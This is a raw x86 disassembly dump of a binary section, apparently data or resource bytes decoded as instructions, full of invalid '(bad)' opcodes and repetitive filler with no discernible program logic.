  405aae:	adc    eax,0x3041517
  405ab3:	pop    ss
  405ab4:	sbb    al,0x25
  405ab6:	cmp    al,0x3c
  405ab8:	cmp    al,0x3e
  405aba:	ds ds ds aas 
  405abe:	aas    
  405abf:	cmp    DWORD PTR [eax-0x22],esp
  405ac2:	(bad)  
  405ac3:	nop
  405ac4:	add    BYTE PTR [eax],al
  405ac6:	add    BYTE PTR [eax],al
  405ac8:	add    ah,dl
  405aca:	aad    0xd5
  405acc:	lahf   
  405acd:	stos   BYTE PTR es:[edi],al
  405ace:	int    0x90
  405ad0:	nop
  405ad1:	lahf   
  405ad2:	mov    ds:0x16020286,al
  405ad7:	push   ss
  405ad8:	push   ss
  405ad9:	push   ss
  405ada:	push   ss
  405adb:	push   ss
  405adc:	adc    al,0x14
  405ade:	pop    ss
  405adf:	push   ss
  405ae0:	add    eax,0x1c039092
  405ae5:	cmp    al,0x56
  405ae7:	push   esi
  405ae8:	inc    eax
  405ae9:	inc    eax
  405aea:	push   edi
  405aeb:	push   edi
  405aec:	push   edi
  405aed:	push   edi
  405aee:	pop    edx
  405aef:	aas    
  405af0:	pop    edx
  405af1:	fstp   st(5)
  405af3:	mov    al,BYTE PTR [eax]
  405af5:	add    BYTE PTR [eax],al
  405af7:	add    BYTE PTR [eax],al
  405af9:	rcl    ebp,cl
  405afb:	aad    0x9f
  405afd:	stos   BYTE PTR es:[edi],al
  405afe:	int    0x94
  405b00:	xchg   ebp,eax
  405b01:	xchg   ebp,eax
  405b02:	int    0x93
  405b04:	push   ss
  405b05:	sbb    DWORD PTR [eax],esp
  405b07:	sbb    BYTE PTR [eax],bl
  405b09:	push   ss
  405b0a:	push   ss
  405b0b:	push   ss
  405b0c:	adc    al,0x17
  405b0e:	adc    eax,0xaaa99904
  405b13:	dec    esp
  405b14:	and    DWORD PTR [eax+0x59],eax
  405b17:	pop    ecx
  405b18:	pop    edx
  405b19:	pop    edx
  405b1a:	pop    esp
  405b1b:	pop    edx
  405b1c:	pop    ebp
  405b1d:	pop    esp
  405b1e:	pop    ebp
  405b1f:	pop    eax
  405b20:	pop    eax
  405b21:	fucom  st(0)
  405b23:	add    DWORD PTR [eax],0x0
  405b26:	add    BYTE PTR [eax],al
  405b28:	add    dh,dl
  405b2a:	aad    0xd7
  405b2c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405b2d:	stos   BYTE PTR es:[edi],al
  405b2e:	rcl    DWORD PTR [ebp-0x5d31606e],cl
  405b34:	pop    ds
  405b35:	sbb    DWORD PTR [esi],esp
  405b37:	and    BYTE PTR [eax],ah
  405b39:	sbb    BYTE PTR [eax],bl
  405b3b:	push   ss
  405b3c:	adc    eax,0xe29b2817
  405b41:	fxch   st(5)
  405b43:	fldenv [edi]
  405b45:	pop    ecx
  405b46:	pop    esp
  405b47:	pop    esp
  405b48:	pop    esi
  405b49:	pop    esi
  405b4a:	pop    esi
  405b4b:	pop    esi
  405b4c:	pop    esi
  405b4d:	pop    esi
  405b4e:	arpl   WORD PTR [ebp+0x5d],bx
  405b51:	(bad)  
  405b52:	in     eax,dx
  405b53:	nop
  405b54:	add    BYTE PTR [eax],al
  405b56:	add    BYTE PTR [eax],al
  405b58:	add    dh,dl
  405b5a:	xlat   BYTE PTR ds:[ebx]
  405b5b:	int    0x90
  405b5d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405b5e:	rcr    DWORD PTR [ebp+eiz*4+0x29ccd3aa],cl
  405b65:	sbb    DWORD PTR [edx],ebp
  405b67:	es es and BYTE PTR es:[edi],dl
  405b6c:	adc    al,0x5
  405b6e:	int    0xf4
  405b70:	out    0x88,al
  405b72:	mov    esi,0x614896e6
  405b77:	popa   
  405b78:	popa   
  405b79:	arpl   WORD PTR [ebx+0x63],sp
  405b7c:	push   0x6a
  405b7e:	imul   ebp,DWORD PTR [ebx+0x5d],0xffffffc1
  405b82:	in     eax,dx
  405b83:	xchg   ecx,eax
  405b84:	(bad)  
  405b85:	add    BYTE PTR [eax],al
  405b87:	add    BYTE PTR [eax],al
  405b89:	rcl    esp,cl
  405b8b:	mov    edi,0xa9dda587
  405b90:	test   eax,0x43d0d3aa
  405b95:	sbb    DWORD PTR [ebx],edi
  405b97:	sub    ch,BYTE PTR [edx]
  405b99:	sub    BYTE PTR [eax],ah
  405b9b:	push   ss
  405b9c:	sub    ebp,ebx
  405b9e:	cld    
  405b9f:	hlt    
  405ba0:	dec    ecx
  405ba1:	and    DWORD PTR [ebx-0x1a],edx
  405ba4:	stc    
  405ba5:	push   esp
  405ba6:	bound  ebp,QWORD PTR [esp+ebp*2+0x6c]
  405baa:	ins    BYTE PTR es:[edi],dx
  405bab:	ins    BYTE PTR es:[edi],dx
  405bac:	ins    DWORD PTR es:[edi],dx
  405bad:	ins    DWORD PTR es:[edi],dx
  405bae:	ins    BYTE PTR es:[edi],dx
  405baf:	outs   dx,BYTE PTR ds:[esi]
  405bb0:	pop    edi
  405bb1:	mov    ebx,0xa595ed
  405bb6:	add    BYTE PTR [eax],al
  405bb8:	add    bl,dl
  405bba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405bbb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405bbc:	sbb    DWORD PTR [edi-0x32555523],0xffffffd6
  405bc3:	into   
  405bc4:	dec    ebp
  405bc5:	sbb    DWORD PTR [ebp+0x3b],eax
  405bc8:	cmp    edi,DWORD PTR [ebx]
  405bca:	pop    ss
  405bcb:	pop    ds
  405bcc:	mov    esi,0x1c50f1fc
  405bd1:	sbb    eax,0xe6f9c025
  405bd6:	push   edx
  405bd7:	lods   eax,DWORD PTR ds:[esi]
  405bd8:	lods   eax,DWORD PTR ds:[esi]
  405bd9:	lods   eax,DWORD PTR ds:[esi]
  405bda:	scas   al,BYTE PTR es:[edi]
  405bdb:	scas   al,BYTE PTR es:[edi]
  405bdc:	scas   al,BYTE PTR es:[edi]
  405bdd:	scas   al,BYTE PTR es:[edi]
  405bde:	scas   al,BYTE PTR es:[edi]
  405bdf:	mov    ch,0x6b
  405be1:	mov    cl,0xef
  405be3:	test   eax,0x95
  405be8:	add    dh,dl
  405bea:	mov    al,ds:0xdd9f8dbc
  405bef:	rcl    ebx,cl
  405bf1:	(bad)  
  405bf2:	(bad)  
  405bf3:	fdiv   DWORD PTR [eax+0x18]
  405bf6:	inc    edi
  405bf7:	inc    esp
  405bf8:	inc    ebp
  405bf9:	sub    al,0x15
  405bfb:	pop    ss
  405bfc:	cmp    al,BYTE PTR [ebp+0x2d1d213a]
  405c02:	sbb    eax,0x9bfcf348
  405c07:	imul   ebp,DWORD PTR [esi-0x4c4a5051],0x6eb5b5b5
  405c11:	scas   eax,DWORD PTR es:[edi]
  405c12:	in     eax,dx
  405c13:	lds    edx,FWORD PTR [edx+0x0]
  405c19:	aam    0x89
  405c1b:	je     0x405bac
  405c1d:	mov    esp,0xd9d3d9de
  405c22:	(bad)  
  405c24:	lea    ebx,[edi]
  405c26:	inc    edi
  405c27:	inc    edi
  405c28:	dec    eax
  405c29:	and    BYTE PTR ds:0x1c1c1c17,dl
  405c2f:	sbb    eax,0x2d2d2d1d
  405c34:	mov    edx,0xb484fcf9
  405c39:	mov    ch,0xb5
  405c3b:	mov    ch,0xb5
  405c3d:	mov    ch,0xb5
  405c3f:	ret    
  405c40:	scas   al,BYTE PTR es:[edi]
  405c41:	scas   eax,DWORD PTR es:[edi]
  405c42:	out    dx,eax
  405c43:	rcl    DWORD PTR [eax+0x0],cl
  405c49:	add    BYTE PTR [ebp+0x66],ah
  405c4c:	jae    0x405c0a
  405c4e:	in     al,0xd9
  405c50:	(bad)  
  405c52:	(bad)  
  405c54:	pushf  
  405c55:	sub    BYTE PTR [eax+0x4b],cl
  405c58:	dec    ebx
  405c59:	pop    ss
  405c5a:	adc    eax,0x211c1c1c
  405c5f:	sbb    eax,0x332d2d2d
  405c64:	imul   ebx,ebx,0xc368f4f9
  405c6a:	ret    
  405c6b:	ret    
  405c6c:	(bad)
  405c70:	mov    ch,0xb3
  405c72:	out    0xdd,al
  405c74:	add    DWORD PTR [eax],0x0
  405c77:	add    BYTE PTR [eax],al
  405c79:	add    BYTE PTR [esi+eax*1+0x11],ah
  405c7d:	int    0xe3
  405c7f:	aad    0xdd
  405c81:	(bad)  
  405c83:	(bad)  [edx+0x4555472a]
  405c89:	adc    eax,0x1c1c1c17
  405c8e:	sbb    eax,0x2e322d2d
  405c93:	ss mov ch,0xb0
  405c96:	loop   0x405c91
  405c98:	int    0xac
  405c9a:	(bad)  
  405c9b:	(bad)  
  405c9c:	(bad)  
  405c9d:	leave  
  405c9e:	(bad)  
  405c9f:	retf   0xafc7
  405ca2:	lock fnstsw WORD PTR [esi+0x0]
  405ca6:	add    BYTE PTR [eax],al
  405ca8:	add    BYTE PTR [eax],al
  405caa:	or     al,BYTE PTR [ecx]
  405cac:	bswap  ebp
  405cae:	in     eax,0xde
  405cb0:	aad    0xdd
  405cb2:	fucom  st(6)
  405cb4:	stos   BYTE PTR es:[edi],al
  405cb5:	sub    cl,BYTE PTR [ebx+0x69]
  405cb8:	and    BYTE PTR [edx],bl
  405cba:	sbb    al,0x1c
  405cbc:	sbb    eax,0x32322d2d
  405cc1:	xor    al,0x30
  405cc3:	inc    ecx
  405cc4:	(bad)  
  405cc5:	leave  
  405cc6:	(bad)  
  405cc9:	xchg   edx,eax
  405ccb:	retf   0xcaca
  405cce:	retf   0xcae7
  405cd1:	mov    bl,0xe3
  405cd3:	loop   0x405c58
  405cd5:	add    BYTE PTR [eax],al
  405cd7:	add    BYTE PTR [eax],al
  405cd9:	add    BYTE PTR [eax+ecx*1],cl
  405cdc:	jno    0x405c7d
  405cde:	lock aad 0xdd
  405ce1:	fstp   st(5)
  405ce3:	out    0xc5,al
  405ce5:	sub    DWORD PTR [ebx+0x53],ecx
  405ce8:	sbb    al,0x1a
  405cea:	sbb    al,0x1d
  405cec:	sbb    eax,0x32322e2d
  405cf1:	xor    al,0x30
  405cf3:	pop    edi
  405cf4:	out    0xe7,eax
  405cf6:	enter  0xd99b,0xe6
  405cfa:	xchg   cl,cl
  405cfc:	out    0xe9,eax
  405cfe:	jmp    0xdaf846ec
  405d03:	out    dx,eax
  405d04:	adc    esi,0x0
  405d07:	add    BYTE PTR [eax],al
  405d09:	add    BYTE PTR [edx+0x7e],bh
  405d0c:	and    esi,0xfffffffc
  405d0f:	cld    
  405d10:	lock out 0xdd,al
  405d13:	loop   0x405ced
  405d15:	inc    ebx
  405d16:	dec    ebx
  405d17:	inc    esi
  405d18:	adc    eax,0x2d1d1c1c
  405d1d:	sub    eax,0x3032322e
  405d22:	xor    eax,0xe9e9ea6e
  405d27:	mov    ebx,0x86ddd3a7
  405d2c:	jmp    0xec2b481b
  405d31:	(bad)  
  405d32:	enter  0x90f3,0xaa
  405d36:	add    BYTE PTR [eax],al
  405d38:	add    BYTE PTR [eax],al
  405d3a:	add    al,dh
  405d3c:	stos   BYTE PTR es:[edi],al
  405d3d:	fucomp st(7)
  405d3f:	stc    
  405d40:	cld    
  405d41:	cld    
  405d42:	cld    
  405d43:	hlt    
  405d44:	fimul  WORD PTR [esi+0x3b]
  405d47:	and    al,0x15
  405d49:	sbb    al,0x1d
  405d4b:	sbb    eax,0x322e2d2d
  405d50:	xor    al,0x34
  405d52:	aaa    
  405d53:	ret    
  405d54:	jmp    0x405d40
  405d56:	jmp    0xbe9f:0xd39cbaea
  405d5d:	jmp    0x405d4a
  405d5f:	jmp    0x405d4c
  405d61:	leave  
  405d62:	enter  0x95f7,0xa9
	...
  405d6e:	(bad)  [edx-0x3061d23]
  405d74:	in     eax,0x84
  405d76:	adc    eax,0x1d1c1c1a
  405d7b:	sbb    eax,0x32322e2d
  405d80:	xor    eax,0xf5e74134
  405d85:	jmp    0x9ba7:0xbaeaeaea
  405d8c:	call   0xf72c497c
  405d91:	retf   0xf9c8
  405d94:	test   eax,0x92
	...
  405da1:	(bad)  [edx+0x28bddd6]
  405da7:	sbb    bl,BYTE PTR [esp+ebx*1]
  405daa:	sbb    eax,0x322e2e1d
  405daf:	xor    dh,BYTE PTR [esi*1-0x150a14a1]
  405db6:	cmc    
  405db7:	jmp    0x405dae
  405db9:	jmp    0x405da6
  405dbb:	cmc    
  405dbc:	jmp    0x405db4
  405dbe:	div    dh
  405dc0:	cli    
  405dc1:	jmp    0x405d8b
  405dc3:	sti    
  405dc4:	(bad)  
  405dc5:	nop
	...
  405dd2:	add    BYTE PTR [eax],al
  405dd4:	fcomp  DWORD PTR [esi+edx*1+0x1d1c1c15]
  405ddb:	sub    eax,0x34322e2d
  405de0:	xor    eax,0xf5f66e34
  405de5:	cmc    
  405de6:	cmc    
  405de7:	cmc    
  405de8:	div    dh
  405dea:	div    dh
  405dec:	cmc    
  405ded:	jmp    0x405dda
  405def:	jmp    0x405dda
  405df1:	(bad)  
  405df2:	mov    dl,0xf9
  405df4:	loop   0x405e70
	...
  405e02:	add    BYTE PTR [eax],al
  405e04:	add    BYTE PTR [ecx+0x211a1a16],ch
  405e0a:	sbb    eax,0x32312e1d
  405e0f:	xor    al,0x35
  405e11:	aaa    
  405e12:	(bad)  
  405e13:	cld    
  405e14:	cmc    
  405e15:	jmp    0x405e01
  405e17:	jmp    0xc80a2903
  405e1c:	(bad)  
  405e1d:	mov    dh,0xb6
  405e1f:	ret    0xc8c8
  405e22:	enter  0xf0f9,0x7f
	...
  405e32:	add    BYTE PTR [eax],al
  405e34:	add    dh,cl
  405e36:	sub    DWORD PTR ds:0x2d1d1d1d,edx
  405e3c:	xor    ch,BYTE PTR [esi]
  405e3e:	xor    BYTE PTR [eax],dh
  405e40:	das    
  405e41:	xor    eax,0xb4afb66d
  405e46:	mov    ah,0xb9
  405e48:	mov    ebx,0xdac8c8c6
  405e4d:	fcmovu st,st(3)
  405e4f:	out    0xe6,al
  405e51:	out    0xf2,al
  405e53:	xrelease lock add BYTE PTR [eax],al
	...
  405e63:	add    BYTE PTR [eax],al
  405e65:	rol    DWORD PTR [edx+0x1a],1
  405e68:	sbb    bl,BYTE PTR [ebx]
  405e6a:	sbb    ebx,DWORD PTR [ebx]
  405e6c:	sbb    eax,0x53593e25
  405e71:	stos   DWORD PTR es:[edi],eax
  405e72:	mov    ebx,0xddddd5c1
  405e77:	fstp   st(5)
  405e79:	loop   0x405e5c
  405e7b:	in     eax,0xe6
  405e7d:	lock xrelease add BYTE PTR [eax],al
	...
  405e95:	into   
  405e96:	dec    edi
  405e97:	daa    
  405e98:	inc    ebx
  405e99:	push   esp
  405e9a:	mov    BYTE PTR [ecx-0x21212e59],dl
  405ea0:	loope  0x405e87
  405ea2:	fsubrp st(2),st
  405ea4:	out    0xe6,al
  405ea6:	lock add BYTE PTR [eax],al
	...
  405ec5:	stos   BYTE PTR es:[edi],al
  405ec6:	(bad)  
  405ec7:	rcr    dh,cl
  405ec9:	(bad)  
  405ecb:	in     al,0xe4
  405ecd:	out    0xef,al
	...
  405ef3:	add    BYTE PTR [eax],al
  405ef5:	add    dh,ah
	...
  405fd7:	add    bh,bh
  405fd9:	(bad)  
  405fda:	(bad)  
  405fdb:	(bad)  
  405fdc:	(bad)  
  405fdd:	inc    DWORD PTR [eax]
  405fdf:	add    bh,bh
  405fe1:	(bad)  
  405fe2:	(bad)  
  405fe3:	(bad)  
  405fe4:	(bad)  
  405fe5:	inc    DWORD PTR [eax]
  405fe7:	add    bh,bh
  405fe9:	(bad)  
  405fea:	(bad)  
  405feb:	(bad)  
  405fec:	(bad)  
  405fed:	inc    DWORD PTR [eax]
  405fef:	add    bh,bh
  405ff1:	(bad)  
  405ff2:	inc    DWORD PTR [eax+0xffff]
  405ff8:	(bad)  
  405ff9:	(bad)  
  405ffa:	cld    
  405ffb:	add    BYTE PTR [edi],cl
  405ffd:	inc    DWORD PTR [eax]
  405fff:	add    bh,bh
  406001:	push   eax
  406003:	add    BYTE PTR [ebx],al
  406005:	inc    DWORD PTR [eax]
  406007:	add    bh,bh
  406009:	inc    eax
  40600b:	add    BYTE PTR [ecx],al
  40600d:	inc    DWORD PTR [eax]
  40600f:	add    bh,bh
  406011:	inc    DWORD PTR [eax+0xff0000]
  406017:	add    bh,bh
  406019:	inc    DWORD PTR [eax+0xff0000]
  40601f:	add    bh,bh
  406021:	inc    DWORD PTR [eax+0xff0000]
  406027:	add    bh,bh
  406029:	inc    DWORD PTR [eax+0xff0000]
  40602f:	add    bl,ah
  406031:	inc    eax
  406033:	add    BYTE PTR [eax],al
  406035:	lahf   
  406036:	add    BYTE PTR [eax],al
  406038:	rol    BYTE PTR [edi],0xe0
  40603b:	add    BYTE PTR [eax],al
  40603d:	pop    ds
  40603e:	add    BYTE PTR [eax],al
  406040:	add    BYTE PTR [ecx],0xf8
  406043:	add    BYTE PTR [eax],al
  406045:	pop    ds
  406046:	add    BYTE PTR [eax],al
  406048:	add    BYTE PTR [eax],0x7f
  40604b:	add    BYTE PTR [eax],al
  40604d:	pop    ds
  40604e:	add    BYTE PTR [eax],al
  406050:	add    BYTE PTR [eax],0x1c
  406053:	add    BYTE PTR [eax],al
  406055:	sldt   WORD PTR [eax]
  406058:	add    BYTE PTR [eax],0x0
  40605b:	add    BYTE PTR [eax],al
  40605d:	sldt   WORD PTR [eax]
  406060:	add    BYTE PTR [eax],0x0
  406063:	add    BYTE PTR [eax],al
  406065:	sldt   WORD PTR [eax]
  406068:	add    BYTE PTR [eax],0x0
  40606b:	add    BYTE PTR [eax],al
  40606d:	sldt   WORD PTR [eax]
  406070:	add    BYTE PTR [eax],0x0
  406073:	add    BYTE PTR [eax],al
  406075:	sldt   WORD PTR [eax]
  406078:	add    BYTE PTR [eax],0x0
  40607b:	add    BYTE PTR [eax],al
  40607d:	sldt   WORD PTR [eax]
  406080:	add    BYTE PTR [eax],0x0
  406083:	add    BYTE PTR [eax],al
  406085:	sldt   WORD PTR [eax]
  406088:	add    BYTE PTR [eax],0x0
  40608b:	add    BYTE PTR [eax],al
  40608d:	sldt   WORD PTR [eax]
  406090:	add    BYTE PTR [eax],0x0
  406093:	add    BYTE PTR [eax],al
  406095:	sldt   WORD PTR [eax]
  406098:	add    BYTE PTR [eax],0x0
  40609b:	add    BYTE PTR [eax],al
  40609d:	pop    es
  40609e:	add    BYTE PTR [eax],al
  4060a0:	add    BYTE PTR [eax],0x0
  4060a3:	add    BYTE PTR [eax],al
  4060a5:	pop    es
  4060a6:	add    BYTE PTR [eax],al
  4060a8:	add    BYTE PTR [eax],0x0
  4060ab:	add    BYTE PTR [eax],al
  4060ad:	pop    es
  4060ae:	add    BYTE PTR [eax],al
  4060b0:	add    BYTE PTR [eax],0x0
  4060b3:	add    BYTE PTR [eax],al
  4060b5:	pop    es
  4060b6:	add    BYTE PTR [eax],al
  4060b8:	add    BYTE PTR [eax],0x0
  4060bb:	add    BYTE PTR [eax],al
  4060bd:	pop    es
  4060be:	add    BYTE PTR [eax],al
  4060c0:	rol    BYTE PTR [eax],0x0
  4060c3:	add    BYTE PTR [eax],al
  4060c5:	pop    es
  4060c6:	add    BYTE PTR [eax],al
  4060c8:	rol    BYTE PTR [eax],0x0
  4060cb:	add    BYTE PTR [eax],al
  4060cd:	pop    es
  4060ce:	add    BYTE PTR [eax],al
  4060d0:	rol    BYTE PTR [eax],0x0
  4060d3:	add    BYTE PTR [eax],al
  4060d5:	pop    es
  4060d6:	add    BYTE PTR [eax],al
  4060d8:	rol    BYTE PTR [eax],0x0
  4060db:	add    BYTE PTR [eax],al
  4060dd:	add    eax,DWORD PTR [eax]
  4060df:	add    al,al
  4060e1:	add    BYTE PTR [eax],al
  4060e3:	add    BYTE PTR [eax],al
  4060e5:	add    eax,DWORD PTR [eax]
  4060e7:	add    al,ah
  4060e9:	add    BYTE PTR [eax],al
  4060eb:	add    BYTE PTR [eax],al
  4060ed:	add    eax,DWORD PTR [eax]
  4060ef:	add    ah,bh
  4060f1:	add    BYTE PTR [eax],al
  4060f3:	add    BYTE PTR [eax],al
  4060f5:	add    eax,DWORD PTR [eax]
  4060f7:	add    bh,bh
  4060f9:	add    BYTE PTR [eax],0x0
  4060fc:	add    BYTE PTR [ebx],al
  4060fe:	add    BYTE PTR [eax],al
  406100:	push   eax
  406102:	add    BYTE PTR [eax],al
  406104:	add    BYTE PTR [ebx],al
  406106:	add    BYTE PTR [eax],al
  406108:	(bad)  
  406109:	clc    
  40610a:	add    BYTE PTR [eax],al
  40610c:	add    BYTE PTR [ebx],al
  40610e:	add    BYTE PTR [eax],al
  406110:	(bad)  
  406111:	clc    
  406112:	add    BYTE PTR [eax],al
  406114:	add    BYTE PTR [edi],al
  406116:	add    BYTE PTR [eax],al
  406118:	(bad)  
  406119:	clc    
  40611a:	add    BYTE PTR [eax],al
  40611c:	add    edi,edi
  40611e:	add    BYTE PTR [eax],al
  406120:	(bad)  
  406121:	clc    
  406122:	add    BYTE PTR [ecx],al
  406124:	(bad)  
  406125:	inc    DWORD PTR [eax]
  406127:	add    bh,bh
  406129:	clc    
  40612a:	add    edi,edi
  40612c:	(bad)  
  40612d:	inc    DWORD PTR [eax]
  40612f:	add    bh,bh
  406131:	std    
  406132:	(bad)  
  406133:	(bad)  
  406134:	(bad)  
  406135:	inc    DWORD PTR [eax]
  406137:	add    bh,bh
  406139:	(bad)  
  40613a:	(bad)  
  40613b:	(bad)  
  40613c:	(bad)  
  40613d:	inc    DWORD PTR [eax]
  40613f:	add    bh,bh
  406141:	(bad)  
  406142:	(bad)  
  406143:	(bad)  
  406144:	(bad)  
  406145:	inc    DWORD PTR [eax]
  406147:	add    bh,bh
  406149:	(bad)  
  40614a:	(bad)  
  40614b:	(bad)  
  40614c:	(bad)  
  40614d:	inc    DWORD PTR [eax]
  40614f:	add    bh,bh
  406151:	(bad)  
  406152:	(bad)  
  406153:	(bad)  
  406154:	(bad)  
  406155:	inc    DWORD PTR [eax]
  406157:	add    BYTE PTR [eax],ch
  406159:	add    BYTE PTR [eax],al
  40615b:	add    BYTE PTR [eax],ah
  40615d:	add    BYTE PTR [eax],al
  40615f:	add    BYTE PTR [eax+0x0],al
  406162:	add    BYTE PTR [eax],al
  406164:	add    DWORD PTR [eax],eax
  406166:	or     BYTE PTR [eax],al
  406168:	add    BYTE PTR [eax],al
  40616a:	add    BYTE PTR [eax],al
  40616c:	add    BYTE PTR [eax+eax*1],al
	...
  406177:	add    BYTE PTR [eax],al
  406179:	add    DWORD PTR [eax],eax
  40617b:	add    BYTE PTR [eax],al
  40617d:	add    DWORD PTR [eax],eax
  40617f:	add    BYTE PTR [eax],al
  406181:	add    BYTE PTR [eax],al
  406183:	add    BYTE PTR [eax+eax*1+0x0],dh
  406187:	add    BYTE PTR [eax+eax*1+0x0],bh
  40618b:	add    BYTE PTR [edi+0x1d],dh
  40618e:	push   ss
  40618f:	add    BYTE PTR [edi+0x22],dh
  406192:	sbb    DWORD PTR [eax],eax
  406194:	jns    0x4061ba
  406196:	sbb    al,BYTE PTR [eax]
  406198:	inc    edi
  406199:	es sub eax,0x222b6f00
  40619f:	add    BYTE PTR [edi+ebp*1+0x2a],bh
  4061a3:	add    BYTE PTR [eax],al
  4061a5:	jnp    0x4061e0
  4061a7:	add    BYTE PTR [ecx+0x49],cl
  4061aa:	dec    ecx
  4061ab:	add    BYTE PTR [ebx+0x52],dl
  4061ae:	push   edx
  4061af:	add    BYTE PTR [edx+0x5f],bh
  4061b2:	add    BYTE PTR [bx+0x66],ah
  4061b6:	data16 add BYTE PTR [ecx+0x69],ch
  4061ba:	imul   eax,DWORD PTR [eax],0x697862
  4061c0:	je     0x406235
  4061c2:	je     0x4061c4
  4061c4:	jp     0x40623a
  4061c6:	ja     0x4061c8
  4061c8:	jns    0x406243
  4061ca:	jnp    0x4061cc
  4061cc:	add    DWORD PTR [eax],0x0
  4061cf:	add    BYTE PTR [ebx-0x74000000],cl
  4061d5:	or     al,0x5
  4061d7:	add    BYTE PTR [eax-0x64fffefe],dl
  4061dd:	add    DWORD PTR [eax],eax
  4061df:	add    BYTE PTR [ecx+ecx*1+0x148b0000],bl
  4061e6:	or     DWORD PTR [eax],eax
  4061e8:	nop
  4061e9:	adc    DWORD PTR [ebx],eax
  4061eb:	add    BYTE PTR [ecx-0x71fffff0],bl
  4061f1:	adc    dl,BYTE PTR [ebx]
  4061f3:	add    BYTE PTR [esi-0x6affeee6],cl
  4061f9:	sbb    DWORD PTR [edx],edx
  4061fb:	add    BYTE PTR [ecx-0x51000000],ah
  406201:	add    eax,0xba20000
  406206:	add    BYTE PTR [eax],al
  406208:	stos   DWORD PTR es:[edi],eax
  406209:	or     eax,DWORD PTR [eax]
  40620b:	add    BYTE PTR [esi-0x5afffef6],dh
  406211:	adc    DWORD PTR [eax],eax
  406213:	add    BYTE PTR [edx-0x52ffffeb],ch
  406219:	sbb    BYTE PTR [ecx],al
  40621b:	add    BYTE PTR [ebx-0x4afff5e3],ch
  406221:	push   ss
  406222:	add    BYTE PTR [eax],al
  406224:	mov    ch,0x19
  406226:	add    BYTE PTR [eax],al
  406228:	mov    ebp,0xb800001a
  40622d:	push   ss
  40622e:	or     eax,DWORD PTR [eax]
  406230:	mov    ch,0x1e
  406232:	or     eax,DWORD PTR [eax]
  406234:	(bad)  
  406235:	and    DWORD PTR [edx],ebx
  406237:	add    BYTE PTR [edx-0x5dffe2d8],dl
  40623d:	sub    DWORD PTR [edi],edx
  40623f:	add    BYTE PTR [edx-0x42ffe7d4],dh
  406245:	sub    al,0x1c
  406247:	add    BYTE PTR [edi-0x78ffe2cf],ch
  40624d:	sub    ah,BYTE PTR [eax+eax*1]
  406250:	xchg   ebp,eax
  406251:	sub    esp,DWORD PTR [eax+eax*1]
  406254:	xchg   esp,eax
  406255:	xor    ch,BYTE PTR [ecx]
  406257:	add    BYTE PTR [ebx-0x67ffcecc],dl
  40625d:	xor    eax,0x3a9c0033
  406262:	xor    al,0x0
  406264:	mov    ds:0xad00202b,al
  406269:	and    eax,DWORD PTR ss:[eax]
  40626c:	mov    bh,0x3d
  40626e:	sub    eax,DWORD PTR [eax]
  406270:	mov    ebp,0xab002b3d
  406275:	xor    eax,0xac60033
  40627a:	add    BYTE PTR [eax],al
  40627c:	aam    0xa
  40627e:	add    BYTE PTR [eax],al
  406280:	lds    ebx,FWORD PTR [ecx+eax*1]
  406283:	add    cl,ch
  406285:	pop    es
  406286:	add    BYTE PTR [eax],al
  406288:	lock push cs
  40628a:	add    BYTE PTR [eax],al
  40628c:	jecxz  0x4062a5
  40628e:	add    BYTE PTR [eax],al
  406290:	iret   
  406291:	and    BYTE PTR [eax],al
  406293:	add    bh,dl
  406295:	and    eax,DWORD PTR [eax]
  406297:	add    al,cl
  406299:	sub    DWORD PTR [eax],edx
  40629b:	add    bl,ah
  40629d:	and    BYTE PTR [eax],al
  40629f:	add    bh,dh
  4062a1:	sub    DWORD PTR [edx],eax
  4062a3:	add    BYTE PTR [ebp-0x3bffc2be],dl
  4062a9:	inc    edx
  4062aa:	sub    al,0x0
  4062ac:	(bad)  
  4062ad:	inc    esp
  4062ae:	sub    eax,0x394ac800
  4062b3:	add    cl,dl
  4062b5:	push   edx
  4062b6:	ds add ah,dh
  4062b9:	dec    edx
  4062ba:	sub    BYTE PTR [eax],al
  4062bc:	nop
  4062bd:	inc    ebx
  4062be:	inc    esp
  4062bf:	add    BYTE PTR [ebx-0x70ffbab2],dl
  4062c5:	pop    ebp
  4062c6:	pop    eax
  4062c7:	add    BYTE PTR [ebx-0x5affaca7],bl
  4062cd:	dec    ecx
  4062ce:	inc    edx
  4062cf:	add    BYTE PTR [ecx-0x4fffb3ad],ch
  4062d5:	push   edx
  4062d6:	dec    ecx
  4062d7:	add    BYTE PTR [edx-0x4bffadb0],ah
  4062dd:	pop    ebp
  4062de:	pop    ebp
  4062df:	add    BYTE PTR [ebp-0x4affa69f],dl
  4062e5:	pusha  
  4062e6:	push   ebp
  4062e7:	add    BYTE PTR [esi-0x65ff918e],bl
  4062ed:	jbe    0x406368
  4062ef:	add    BYTE PTR [ebp-0x41ff9d99],dh
  4062f5:	jo     0x40635f
  4062f7:	add    BYTE PTR [edi-0x4fff8a83],ah
  4062fd:	je     0x406371
  4062ff:	add    BYTE PTR [ebx-0x2aff8a83],bh
  406305:	push   esi
  406306:	inc    ebx
  406307:	add    dh,ah
  406309:	pop    edi
  40630a:	inc    edi
  40630b:	add    bh,dl
  40630d:	bound  ecx,QWORD PTR [esi+0x0]
  406310:	lds    ebp,FWORD PTR [ecx+0x59]
  406313:	add    ch,dl
  406315:	gs push ecx
  406317:	add    dl,ah
  406319:	push   0x73eb0053
  40631e:	pop    esp
  40631f:	add    bl,bh
  406321:	ja     0x406380
  406323:	add    ah,cl
  406325:	je     0x40638e
  406327:	add    cl,bl
  406329:	js     0x406393
  40632b:	add    cl,dl
  40632d:	jl     0x4063a9
  40632f:	add    ah,ah
  406331:	ja     0x406397
  406333:	add    ah,dh
  406335:	js     0x40639a
  406337:	add    bl,cl
  406339:	mov    edi,DWORD PTR [edi+0x0]
  40633c:	jmp    0x778c:0xf5007687
  406343:	add    BYTE PTR [edx+0x7f008079],al
  406349:	mov    WORD PTR [esi-0x756b8100],cs
  40634f:	add    BYTE PTR ds:0x4b0085f2,dl
  406355:	(bad)  
  406356:	mov    es,WORD PTR [eax]
  406358:	add    BYTE PTR [edx-0x7876ff7d],0x87
  40635f:	add    BYTE PTR [esi-0x66ff7173],cl
  406365:	test   DWORD PTR [eax-0x6b707600],ecx
  40636b:	add    BYTE PTR [ecx-0x63ff6d72],dl
  406371:	(bad)  
  406372:	xchg   edi,eax
  406373:	add    BYTE PTR [eax-0x77ff6c63],cl
  406379:	xchg   ecx,eax
  40637a:	cwde   
